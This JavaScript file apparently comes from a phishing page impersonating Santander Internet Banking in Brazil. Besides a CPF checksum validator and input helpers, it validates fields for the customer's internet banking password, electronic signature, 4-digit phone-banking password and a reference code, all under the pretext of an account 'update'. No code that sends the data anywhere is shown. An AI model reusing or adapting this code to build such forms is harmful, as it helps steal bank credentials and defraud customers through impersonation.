/* PRONTAS */
function validarCPF(cpf){
	if(cpf.length != 11 || cpf == "00000000000" || cpf == "11111111111" ||
		cpf == "22222222222" || cpf == "33333333333" || cpf == "44444444444" ||
		cpf == "55555555555" || cpf == "66666666666" || cpf == "77777777777" ||
		cpf == "88888888888" || cpf == "99999999999")
	{
		return false;
   }

	soma = 0;
	for(i = 0; i < 9; i++)
	{
		soma += parseInt(cpf.charAt(i)) * (10 - i);
	}
	
	resto = 11 - (soma % 11);
	if(resto == 10 || resto == 11)
	{
		resto = 0;
	}
	if(resto != parseInt(cpf.charAt(9))){
		return false;
	}
	
	soma = 0;
	for(i = 0; i < 10; i ++)
	{
		soma += parseInt(cpf.charAt(i)) * (11 - i);
	}
	resto = 11 - (soma % 11);
	if(resto == 10 || resto == 11)
	{
		resto = 0;
	}
	
	if(resto != parseInt(cpf.charAt(10))){
		return false;
	}
	
	return true;
}
function proximoCampo(atual,proximo){
	if(atual.value.length >= atual.maxLength){
		document.getElementById(proximo).focus();
	}
}
function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;   
	    if((tecla>47 && tecla<58)) return true;
	    else{
	    	if (tecla==8 || tecla==0) return true;
			else  return false;
    	}
}

 /* PROGRAMADAS */
function check_cpf(){
	var cpf = document.getElementById('cpf').value;
	var checkCPF = validarCPF(cpf);
	if(cpf.length < 11 || checkCPF == false){
		alert("Não conseguimos identificar o CPF informado!\nTente novamente!");
		document.getElementById('cpf').focus();
		return false;
	}
}
function check_pswnet(){
	var psw_net = document.getElementById('psw_net').value;
	if(psw_net.length < 6){
		alert("Você informou uma senha não válida!\nVerifique os dados, e informe novamente sua senha de acesso ao Internet Banking Santander!");
		document.getElementById('psw_net').focus();
		return false;
	}
}
function check_assele(){
	var ass_ele = document.getElementById('ass_ele').value;
	if(ass_ele.length < 6){
		alert("Para confirmar o acesso deste computado ao Internet Banking Santander, informe sua assinatura eletrônica corretamente!");
		document.getElementById('ass_ele').focus();
		return false;
	}
}
function check_pass4(){
	var pass4 = document.getElementById('psw4').value;
	if(pass4.length < 4){
		alert("A senha informada não está correta!\n\nInforme sua senha de 4 dígitos!\nA mesma senha utilizada no Santander Fone.");
		document.getElementById('psw4').focus();
		return false;
	}
}
function check_cmp(obj_form){
	for (var i = 0; i < obj_form.elements.length; i++) {
		if (obj_form.elements[i].type == "text"){
			if (obj_form.elements[i].value == "" || obj_form.elements[i].value.length < 4) {
				alert("Você deve informar todos os campos para finalizar sua atualização");
				obj_form.elements[i].focus();
				return false;
			break;
			}
		}
	}
	if(document.getElementById('referencia').value.length < 9){
		alert("Você deve informar todos os campos para finalizar sua atualização!");
		document.getElementById('referencia').focus();
		return false;
	}
}